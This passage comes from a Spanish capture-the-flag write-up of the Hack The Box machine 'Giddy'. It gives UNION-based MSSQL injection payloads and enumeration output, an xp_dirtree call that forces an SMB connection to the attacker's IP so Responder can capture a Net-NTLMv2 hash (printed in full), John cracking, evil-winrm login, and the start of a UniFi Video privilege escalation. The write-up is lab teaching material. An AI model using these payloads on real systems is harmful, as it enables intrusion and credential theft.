+<pre><code class="language-html">http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=33 order by 26;#
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc_SQLi_order26.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<pre><code class="language-html">http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=33 order by 25;#
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc_SQLi_order25.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Bien, 25 columnas, ahora tenemos que jugar con todas y ver en cuál de ellas logramos almacenar valores.</p>
+
+<h3 id="mvc-sqli-union-hola">Descubrimos en cuáles podemos almacenar texto <a href="#mvc-sqli-union-hola">🔗</a></h3>
+
+<hr />
+
+<ul>
+  <li><a href="https://portswigger.net/web-security/sql-injection/union-attacks">Acá una guía de lo que debemos hacer - SQL injection UNION attacks</a>.</li>
+</ul>
+
+<p>Bien, pues creémonos un script superrápido que nos haga las 25 iteraciones (25 columnas) cambiando el valor de cada una por algún texto, si la respuesta del servidor no nos devuelve errores y por el contrario nos devuelve el texto, tendríamos una columna para jugar:</p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/giddy/search_column_union.py">search_column_union.py</a></p>
+</blockquote>
+
+<hr />
+
+<pre><code class="language-py">❱ python3 search_column_union.py 
+
+[+] Payload: 33 UNION SELECT NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
+[+] La columna '2' de nuestro payload nos permite escribir en la web
+
+[+] Payload: 33 UNION SELECT NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
+[+] La columna '3' de nuestro payload nos permite escribir en la web
+
+[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
+[+] La columna '6' de nuestro payload nos permite escribir en la web
+
+[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
+[+] La columna '11' de nuestro payload nos permite escribir en la web
+
+[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
+[+] La columna '12' de nuestro payload nos permite escribir en la web
+
+[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
+[+] La columna '13' de nuestro payload nos permite escribir en la web
+
+[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
+[+] La columna '16' de nuestro payload nos permite escribir en la web
+
+[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
+[+] La columna '17' de nuestro payload nos permite escribir en la web
+
+[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
+[+] La columna '18' de nuestro payload nos permite escribir en la web
+</code></pre>
+
+<p>Perfectisimo, ya vemos varios campos, podemos jugar con cualquiera, tomaré la columna número <code>2</code> (:</p>
+
+<p>Antes de ponernos a dumpear las bases de datos debemos saber contra qué servicio <strong>SQL</strong> estamos enfrentándonos (algunos ya lo sabrán por los errores), para esto juguemos con la variable <code>@@version</code> y veamos:</p>
+
+<h3 id="mvc-sqli-version">Vemos la <u>versión</u> del servicio <u>SQL</u> <a href="#mvc-sqli-version">🔗</a></h3>
+
+<p>Ya podemos quitarnos el bucle e indicarle donde queremos que juegue, entonces empecemos a generar nuestro script para extraer toda la data, pero lo dicho, primero veamos la versión y así saber con qué sintaxis tenemos que seguir la explotación:</p>
+
+<pre><code class="language-sql">33 UNION SELECT campos_null,ELcampoQUEqueremosVERdeLAdb,los_otros_23_campos_null,..,..,..;-- -
+</code></pre>
+
+<p>Entonces como respuesta, en la web veríamos <code>ELcampoQUEqueremosVERdeLAdb</code>:</p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/giddy/extract_data_sqli_errorbased.py#L44">extract_data_sqli_errorbased.py</a></p>
+</blockquote>
+
+<p>Si lo ejecutamos vemos:</p>
+
+<pre><code class="language-bash">❱ python3 extract_data_sqli.py -f '@@version'
+[+] Extrayendo la variable @@version del servicio SQL.
+[+] @@version: 
+    Microsoft SQL Server 2016 (SP1) (KB3182545) - 13.0.4001.0 (X64) 
+        Oct 28 2016 18:17:30 
+        Copyright (c) Microsoft Corporation
+        Express Edition (64-bit) on Windows Server 2016 Standard 6.3 &lt;X64&gt; (Build 14393: ) (Hypervisor)
+</code></pre>
+
+<p>Opa, estamos ante el servicio de bases de datos <a href="https://searchdatacenter.techtarget.com/es/definicion/SQL-Server">Microsoft SQL Server</a>, pues ahora sabemos que no podemos usar las mismas <strong>sentencias</strong> que usamos con <code>MySQL</code>; es mi primer approach contra este servicio y su explotación, así que vamos a darle duro y aprendemos juntos.</p>
+
+<p>Investigando encontramos varios recursos, podemos destacar 2:</p>
+
+<ul>
+  <li><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">MSSQL Injection Cheat Sheet</a>.</li>
+  <li><a href="https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/">MSSQL Practical Injection Cheat Sheet</a>.</li>
+  <li><a href="http://www.securityidiots.com/Web-Pentest/SQL-Injection/MSSQL/MSSQL-Union-Based-Injection.html">Step By Step MSSQL Union Based Injection</a>.</li>
+</ul>
+
+<p>Vemos algunas variables para probar, intentemos ver el usuario que la base de datos actual:</p>
+
+<pre><code class="language-bash">❱ python3 extract_data_sqli.py -f 'user_name()'
+[+] Extrayendo la variable user_name() del servicio SQL.
+[+] user_name(): Giddy\stacy
+</code></pre>
+
+<pre><code class="language-bash">❱ python3 extract_data_sqli.py -f 'user'
+[+] Extrayendo la variable user del servicio SQL.
+[+] user: Giddy\stacy
+</code></pre>
+
+<pre><code class="language-bash">❱ python3 extract_data_sqli.py -f 'system_user'
+[+] Extrayendo la variable system_user del servicio SQL.
+[+] system_user: giddy\stacy
+</code></pre>
+
+<p>Listones, tenemos al usuario <code>stacy</code> para guardarlo en nuestros pensamientos, ahora sí, empecemos a explotar estooooooooooooooooooo!!</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153google_gif_letsgoseinfeld.gif" style="display: block; margin-left: auto; margin-right: auto; width: 60%;" /></p>
+
+<h3 id="mvc-sqli-dbs">Extraemos las <u>bases de datos</u> actuales del servicio <u>MSSQL</u> <a href="#mvc-sqli-dbs">🔗</a></h3>
+
+<p>Con ayuda <a href="https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">del primer recurso</a> referenciado antes, vemos una manera de extraer todas las bases de datos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153google_monkey_mssql_dbs.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Juguemos con la última línea, armemos un bucle por ejemplo de <strong>10</strong> bases de datos y veamos que surge:</p>
+
+<p>(Es prácticamente igual a nuestra inyección por campos, solo que en esta generamos un bucle para que vaya iterando entre las N bases de datos que existan)</p>
+
+<pre><code class="language-sql">33 UNION SELECT campos_null,DB_NAME(N),los_otros_23_campos_null,..,..,.. ORDER BY 1;-- -
+</code></pre>
+
+<p>Le indicamos el <a href="https://stackoverflow.com/questions/3445118/what-is-the-purpose-of-order-by-1-in-sql-select-statement">ORDER BY 1</a> para que lo que nos devuelva lo posicione en la primera columna (así nos es más fácil jugar con el script).</p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/giddy/extract_data_sqli_errorbased.py#L44">extract_data_sqli_errorbased.py</a></p>
+</blockquote>
+
+<p>Ejecutamos yyyyyy:</p>
+
+<pre><code class="language-bash">❱ python3 extract_data_sqli.py
+[+] Extrayendo las bases de datos del servicio MSSQL.
+
+[+] Base de datos [0]: Injection
+[+] Base de datos [1]: master
+[+] Base de datos [2]: tempdb
+[+] Base de datos [3]: model
+[+] Base de datos [4]: msdb
+</code></pre>
+
+<p>Bien, 5 bases de datos, juguemos inicialmente con <code>Injection</code> (que tiene un nombre moooooooooooooy llamativo) a ver que tablas tiene:</p>
+
+<h3 id="mvc-sqli-tables">Extraemos las <u>tablas</u> de la base de datos <u>Injection</u> <a href="#mvc-sqli-tables">🔗</a></h3>
+
+<p>Acá ya empezamos a limitar los resultados a <strong>1</strong> por fila, así lo único que debemos hacer es cambiar la fila en la que estamos pero siempre recibiendo un resultado.</p>
+
+<blockquote>
+  <p>Sé que se pudo haber hecho que una sola consulta arrojara tooodo y de ese toooodo extraer las cositas, pero me parecio más sencillo de implementar uno por uno.</p>
+</blockquote>
+
+<pre><code class="language-sql">33 UNION SELECT CAMPOS_NULL,table_name,LOS_OTROS_23_CAMPOS_NULL,..,..,.. FROM [nombreDB].information_schema.tables ORDER BY 1 OFFSET N ROWS FETCH FIRST 1 ROWS ONLY;-- -
+</code></pre>
+
+<p>Donde nos extraerá el nombre de las tablas que hay en la DB <code>nombreDB</code>, esto obtenido de la consulta <code>information_schema.tables</code> PEEEEEEERO en vez de <code>LIMIT</code> (como <code>MySQL</code>) usamos <code>OFFSET</code> y <code>FETCH</code> para limitar los resultados.</p>
+
+<p>Lo que hacemos es decirle:</p>
+
+<blockquote>
+  <p>“HEEEEY, limitame los resultados a solo uno (<code>FETCH FIRST 1 ROWS ONLY</code>) y ve cambiando la fila en la que te encuentras por favor (<code>OFFSET N</code> (donde N va de <strong>0</strong> a <strong>1</strong> a <strong>2</strong> y <strong>al numero que sea</strong>))”</p>
+</blockquote>
+
+<ul>
+  <li>Tomado de <a href="https://learnsql.com/cookbook/how-to-limit-rows-in-a-sql-server-result-set/">How to Limit Rows in a SQL Server Result Set</a>.</li>
+</ul>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/giddy/extract_data_sqli_errorbased.py#L44">extract_data_sqli_errorbased.py</a></p>
+</blockquote>
+
+<pre><code class="language-bash">❱ python3 extract_data_sqli.py --dump Injection
+
+[+] Dumpeando tablas de la base de datos 'Injection': ✔
++----------------------+
+| Tablas DB: Injection |
++----------------------+
+| CreditCard           |
+| Product              |
+| ProductCategory      |
+| ProductSubcategory   |
++----------------------+
+</code></pre>
+
+<p>Jmmm, 4 no más, veamos la tabla <code>CreditCard</code> a ver que columnas tiene:</p>
+
+<h3 id="mvc-sqli-columns">Extraemos las <u>columnas</u> en la tabla <u>CreditCard</u> de la base de datos <u>Injection</u> <a href="#mvc-sqli-columns">🔗</a></h3>
+
+<p>Exactamente igual, solo que agregamos contra que tabla queremos trabajar:</p>
+
+<pre><code class="language-sql">33 UNION SELECT CAMPOS_NULL,column_name,LOS_OTROS_23_CAMPOS_NULL,..,..,.. FROM [nombreDB].information_schema.columns WHERE table_name='nombreTABLA' ORDER BY 1 OFFSET N ROWS FETCH FIRST 1 ROWS ONLY;-- -
+</code></pre>
+
+<p>Lo único que cambia es que extraemos las columnas de la DB <code>nombreDB</code> peeero que estén relacionadas con la tabla <code>nombreTABLA</code>, nada más.</p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/giddy/extract_data_sqli_errorbased.py#L44">extract_data_sqli_errorbased.py</a></p>
+</blockquote>
+
+<pre><code class="language-bash">❱ python3 extract_data_sqli.py --dump Injection CreditCard
+[+] Dumpeando columnas de la tabla 'CreditCard' en la base de datos 'Injection': ✔
+
++--------------+
+| Columnas     |
++--------------+
+| CardNumber   |
+| CardType     |
+| CreditCardID |
+| ExpMonth     |
+| ExpYear      |
+| ModifiedDate |
++--------------+
+</code></pre>
+
+<p>Ninguna columna es llamativa, jmmm, sin embargo intentemos ver algún valor, por ejemplo el de <code>CardType</code>:</p>
+
+<h3 id="mvc-sqli-data">Vemos la data de la columna <u>CardType</u> en la tabla <u>CreditCard</u> de la base de datos <u>Injection</u> <a href="#mvc-sqli-data">🔗</a></h3>
+
+<p>Y la más sencilla, solo le indicamos de donde queremos extraer QUÉ data.</p>
+
+<pre><code class="language-sql">33 UNION SELECT CAMPOS_NULL,nombreCAMPO,LOS_OTROS_23_CAMPOS_NULL,..,..,.. FROM [nombreDB]..nombreTABLA ORDER BY 1 OFFSET %d ROWS FETCH FIRST 1 ROWS ONLY;-- -
+</code></pre>
+
+<p>Sencillito, le decimos: “extrae el campo <code>nombreCAMPO</code> de la tabla <code>nombreTABLA</code> que está en la DB <code>nombreDB</code>, muchas gracias”.</p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/giddy/extract_data_sqli_errorbased.py#L44">extract_data_sqli_errorbased.py</a></p>
+</blockquote>
+
+<pre><code class="language-bash">❱ python3 extract_data_sqli.py --dump Injection CreditCard CardType
+[+] Extrayendo valores de la columna 'CardType' en Injection.CreditCard: ✔
+
++---------------+
+| CardType      |
++---------------+
+| ColonialVoice |
+| Distinguish   |
+| SuperiorCard  |
+| Vista         |
++---------------+
+</code></pre>
+
+<p>Pos si, los tipos de tarjetas de crédito 😑</p>
+
+<p>Ahora nos queda movernos entre las bases de datos, sus tablas y columnas a ver en cuáles encontramos algo útil…</p>
+
+<p>…</p>
+
+<h3 id="mvc-sqli-exec">Jugando con comandos de <u>MSSQL</u> <a href="#mvc-sqli-exec">🔗</a></h3>
+
+<p>Después de una ardua enumeración no encontramos nada de nada :(</p>
+
+<blockquote>
+  <p>Al menos nos sacamos un lindo lindo script.</p>
+</blockquote>
+
+<p>Buscando de que otras maneras podemos aprovecharnos de esta inyección, llegamos a esta gran lista de payloads para usar:</p>
+
+<ul>
+  <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md">PayloadAllTheThings - MSSQL Injection</a>.</li>
+</ul>
+
+<p>En él hay <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-command-execution">algunas maneras de ejecutar comandos</a> con la instrucción <a href="https://www.sqlshack.com/es/como-utilizar-el-procedimiento-extendido-xp_cmdshell/">xp_cmdshell</a>, pero probando cositas no obtenemos respuestas :(</p>
+
+<h3 id="smclient-mvc-sqli-exec-xpdirtree"><span style="color: red;">✘</span> Extraemos hash <u>Net-NTLMv2</u> del usuario <u>Stacy</u> <a href="#smclient-mvc-sqli-exec-xpdirtree">🔗</a></h3>
+
+<p>Si seguimos bajando llegamos al apartado <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-unc-path">MSSQL UNC Path</a>, el cual nos indica que <strong>MSSQL</strong> soporta el listado de archivos que existan en un directorio compartido a través de <strong>SMB</strong>, esto mediante la instrucción <a href="https://www.patrickkeisler.com/2012/11/how-to-use-xpdirtree-to-list-all-files.html">xp_dirtree</a>.</p>
+
+<p>Esto es interesante porque si logramos que el usuario de la base de datos (<code>Stacy</code>) haga la conexión contra nuestro folder compartido, llegara con ella un hash como método de autenticación, ese hash puede llegar a ser crackeable, pero claro, dependemos de cuan fuerte o no es la contraseña que hay por detrás.</p>
+
+<ul>
+  <li><a href="https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4">Explicación concreta de los tipos de hashes: <strong>LM</strong>, <strong>NTLM</strong> y <strong>Net-NTLMv2</strong></a>.</li>
+</ul>
+
+<p>Bien, pues compartamos una carpeta, usemos <a href="https://neil-fox.github.io/Impacket-usage-&amp;-detection/#smbclientpy">smbclient.py</a>:</p>
+
+<pre><code class="language-bash">❱ smbserver.py smbFolder $(pwd)
+</code></pre>
+
+<p>La carpeta compartida se llama <code>smbFolder</code> y toma la ruta actual en la que estemos (: ahora ejecutemos la instrucción a ver si llega alguna conexión:</p>
+
+<pre><code class="language-bash">❱ python3 extract_data_sqli.py --command "use master; exec xp_dirtree '\\\10.10.14.5\smbFolder'"
+
+[+] Enviando: ...=33; use master; exec xp_dirtree '\\10.10.14.5\smbFolder';-- -
+
+[+] Listonessss.
+</code></pre>
+
+<p>Si revisamos nuestra carpeta vemos una conexióóóóóóóóóóóóón:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_smbclient_stacy.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Sip, <strong>Stacy</strong> hace dos conexiones por lo tanto vemos dos hashes, si nos <a href="https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4">guiamos del recurso anteriormente citado</a> sabemos que es un hash <strong>Net-NTLMv2</strong>, podemos jugar con <code>John The Ripper</code> e intentar crackearlo:</p>
+
+<p>Lo guardamos en un archivo:</p>
+
+<pre><code class="language-bash">❱ cat stacy.hash 
+Stacy::GIDDY:aaaaaaaa:7314d853e80f9b14ffd777487e0ded22:0101000000000000800c43548681d7018508a21f5f6d94bf00000000010010007a007800530076004200560076004300020010004a007800660055004800650073007900030010007a007800530076004200560076004300040010004a00780066005500480065007300790007000800800c43548681d70106000400020000000800300030000000000000000000000000300000483c10b9e519cd8ccad95791e38cd0e00f9987c059e89a051afd94f7f5f7fb820a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003500000000000000000000000000
+</code></pre>
+
+<p>Y ahora con <code>john</code>:</p>
+
+<pre><code class="language-bash">❱ john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 stacy.hash 
+</code></pre>
+
+<p>Pero la respuesta nos deja muertos:</p>
+
+<blockquote>
+  <p><span style="color: yellow;">No password hashes loaded (see FAQ)</span></p>
+</blockquote>
+
+<h3 id="responder-mvc-sqli-exec-xpdirtree"><span style="color: green;">✔</span> Extraemos hash <u>Net-NTLMv2</u> del usuario <u>Stacy</u> <a href="#responder-mvc-sqli-exec-xpdirtree">🔗</a></h3>
+
+<p>Jmm F, intentando e intentando cositas no logramos respuesta distinta a esa. Leyendo el post de los hashes hablan de una herramienta llamada <a href="https://github.com/lgandx/Responder">responder</a>, la cual (entre muuuchas cosas) también nos sirve como intermediario para cuando alguien intenta conectarse o interactuar con nuestro sistema. Intentemos con ella a ver si vemos algo distinto:</p>
+
+<p>Al ser la primera vez que lo uso, debemos descargarlo:</p>
+
+<ol>
+  <li>Vamos al repo de la tool.</li>
+  <li>En nuestra terminal hacemos <code>git clone https://github.com/lgandx/Responder.git</code>.</li>
+  <li>Y ya tendríamos el programa <code>Responder.py</code>, lo renombraré a <code>responder.py</code> para que sea más sencillo el llamado (que pereza escribir la primera en mayus 😊)</li>
+</ol>
+
+<p>En internet encontramos <a href="https://www.a2secure.com/en/blog/how-to-use-responder-to-capture-netntlm-and-grab-a-shell/">este recurso</a> que nos muestra como usar <code>Responder</code> para capturar hashes <code>NetNTLM</code>.</p>
+
+<p>Si queremos validar el tráfico de alguna interfaz, por ejemplo de la <code>tun0</code>, que seria donde esta <strong>HTB</strong>:</p>
+
+<pre><code class="language-bash">❱ ifconfig 
+docker0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
+        ...
+eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        ...
+lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+        ...
+tun0: flags=4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt;  mtu 1500
+        inet 10.10.14.5  netmask 255.255.254.0  destination 10.10.14.5
+        ...
+</code></pre>
+
+<p>Y ahora ejecutaríamos con el <code>responder</code> que analice el tráfico de esa interfaz:</p>
+
+<pre><code class="language-bash">❱ responder.py -I tun0 -A  
+</code></pre>
+
+<p>Nos desplegara algunas opciones activas o inactivas del programa y al final nos mostrara que esta en escucha por la interfaz <code>tun0</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_responder_tun0_A.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Ahora bien, para capturar el hash de <code>Stacy</code> (que es el user que hace la petición) debemos quitar el parámetro <code>-A</code>:</p>
+
+<pre><code class="language-bash">❱ responder.py -I tun0
+</code></pre>
+
+<p>Lo siguiente será enviar una petición desde el servicio <strong>MSSQL</strong> a nuestra <strong>IP</strong> servida en la interfaz <code>tun0</code>, o sea, a la <code>10.10.14.5</code> y ver que pasa en el <strong>responder</strong>:</p>
+
+<pre><code class="language-bash">❱ python3 extract_data_sqli.py --command "use master; exec xp_dirtree '\\\10.10.14.5'"
+
+[+] Enviando: ...=33; use master; exec xp_dirtree '\\10.10.14.5';-- -
+
+[+] Listonessss.
+</code></pre>
+
+<p>Yyyyyyyyyyyyy:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_responder_stacy_hash.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Bien, también obtenemos el hash <code>Net-NTLMv2</code> de <strong>Stacy</strong>, hagamos lo mismo de antes, lo tomamos, lo guardamos en un archivo y jugamos con <code>john</code>:</p>
+
+<pre><code class="language-bash">❱ john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 stacy.hash 
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_john_stacy_hash_cracked.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>PERFECTISIIIIIIIIIIIIIIIIIIMO, ahora sí logramos que tome el hash y mejor aún, que lo crackeeeeeeeeeeeeeeeeeeee.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153google_gif_football_letsgo.gif" style="display: block; margin-left: auto; margin-right: auto; width: 80%;" /></p>
+
+<p>Que locura, lindo lindo…</p>
+
+<p>Si recordamos en nuestro escaneo de <code>nmap</code>, el servicio <code>WinRM</code> por el puerto <code>5985</code> esta activo, entre las cosas que podemos hacer con él, ahí un recurso que lo aprovecha para generar una consola <strong>PowerShell</strong> llamado <a href="https://www.hackplayers.com/2019/10/evil-winrm-shell-winrm-para-pentesting.html">evil-winrm</a>, usémoslo y de una validemos si las credenciales son funcionales:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_stacyPS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Listones ahora sí, estamos dentro del sistema como el usuario <code>Stacy</code> (:</p>
+
+<p>…</p>
+
+<p>Otra alternativa hubiera sido el usar la interfaz web que encontramos en nuestra enumeración web, la recuerdan? Había un recurso llamado <code>Remote</code>, si intentamos logearnos con esas credenciales, conseguimos una <strong>PowerShell</strong> en la web (que va un toque más rápida que la que tenemos con <code>evil-winrm</code>):</p>
+
+<ul>
+  <li><a href="https://practical365.com/powershell-web-access-just-how-practical-is-it/">Con este recurso vemos un ejemplo de uso de la interfaz web</a>.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_remote_loginCREDS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_remote_loginDONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Si una nos falla o algo así, ya tenemos un respaldo :P sigamos…</p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>En el directorio en el que salimos cuando obtenemos nuestra <strong>PowerShell</strong> vemos un archivo con un nombre algo extraño:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\Stacy\Documents&gt; dir
+
+    Directory: C:\Users\Stacy\Documents
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        6/17/2018   9:36 AM              6 unifivideo
+...
+</code></pre>
+
+<p>Me dio curiosidad y busqué que era eso, la curiosidad nos dio vida:</p>
+
+<blockquote>
+  <p>“unifi-video”, tambien llamado “UniFi” es una solucion de video vigilancia, o sea, de camaras de seguridad.</p>
+</blockquote>
+
+<p>Si le agregamos a nuestra búsqueda <code>"exploit"</code> vemos algo interesante:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153google_unifi_exploitDB.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Lindo, un exploit que nos permite escalar privilegios, es más o menos viejito (concuerda con las fechas de la máquina) así que veámoslo a ver que nos comenta.</p>
+
+<ul>
+  <li><a href="https://www.exploit-db.com/exploits/43390">Ubiquiti UniFi Video 3.7.3 - Local Privilege Escalation</a>.</li>
+</ul>
+
+<p>Tenemos varias cosas a destacar:</p>
+
+<blockquote>
+  <p>Ubiquiti UniFi Video for Windows is installed to <code>C:\ProgramData\\unifi-video\</code> by default.</p>
+</blockquote>
+
+<p>Validemos si efectivamente existe la ruta y tiene el contenido del programa:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\Stacy\Documents&gt; dir C:\ProgramData\\unifi-video\
+
+    Directory: C:\ProgramData\\unifi-video
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        6/16/2018   9:54 PM                bin
+d-----        6/16/2018   9:55 PM                conf
+d-----        6/16/2018  10:56 PM                data
+d-----        6/16/2018   9:54 PM                email
+d-----        6/16/2018   9:54 PM                fw
+d-----        6/16/2018   9:54 PM                lib
+d-----        7/26/2018  11:23 AM                logs
+d-----        6/16/2018   9:55 PM                webapps
+d-----        6/16/2018   9:55 PM                work
+-a----        7/26/2017   6:10 PM         219136 avService.exe
+-a----        6/17/2018  11:23 AM          31685 hs_err_pid1992.log
+-a----        6/17/2018  11:23 AM      534204321 hs_err_pid1992.mdmp
+-a----        8/16/2018   7:48 PM         270597 hs_err_pid2036.mdmp
+-a----        6/16/2018   9:54 PM            780 Ubiquiti UniFi Video.lnk
+-a----        7/26/2017   6:10 PM          48640 UniFiVideo.exe
+-a----        7/26/2017   6:10 PM          32038 UniFiVideo.ico
+-a----        6/16/2018   9:54 PM          89050 Uninstall.exe
+...
+</code></pre>
+
+<p>Perfecto, vamos bien :)</p>
+
+<blockquote>
+  <p>Default permissions on the <code>C:\ProgramData\\unifi-video</code> folder are inherited from <code>C:\ProgramData</code> and are <strong>not explicitly overridden</strong>, which <strong>allows all users</strong>, even <strong>unprivileged</strong> ones, to <strong>append and write files to the application directory</strong>.</p>
+</blockquote>
+
+<p>Validemos si es cierto que tenemos permisos de escritura con ayuda de <code>icacls</code>:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\ProgramData&gt; icacls unifi-video
+unifi-video NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+            BUILTIN\Administrators:(I)(OI)(CI)(F)
+            CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+            BUILTIN\Users:(I)(OI)(CI)(RX)
+            BUILTIN\Users:(I)(CI)(WD,AD,WEA,WA)
+
+Successfully processed 1 files; Failed processing 0 files
+</code></pre>
+
+<p>Pues si, como <code>BUILTIN\Users</code> tenemos varios permisos, pero los interesantes son:</p>
+
+<ul>
+  <li><code>WD</code>: “escribir datos/agregar archivo”.</li>
+  <li><code>AD</code>: “anexar datos/agregar subdirectorio”.</li>
+</ul>
+
+<p>Les dejo una <a href="https://www.pantallazos.es/2018/03/windows-server-icacls-modificar-permisos-NTFS.html">lista</a> de los permisos que encontramos y su significado.</p>
+
+<p>Vamos aún mejor, veamos de que nos sirve saber esto:</p>
+
+<blockquote>
+  <p>Upon <strong>start</strong> and <strong>stop</strong> of the service, it tries to <strong>load and execute</strong> the file at <code>C:\ProgramData\\unifi-video\taskkill.exe</code>. However this file does not exist in the application directory by default at all.</p>
+</blockquote>
+
+<p>Y llega el remate:</p>
+
+<blockquote>
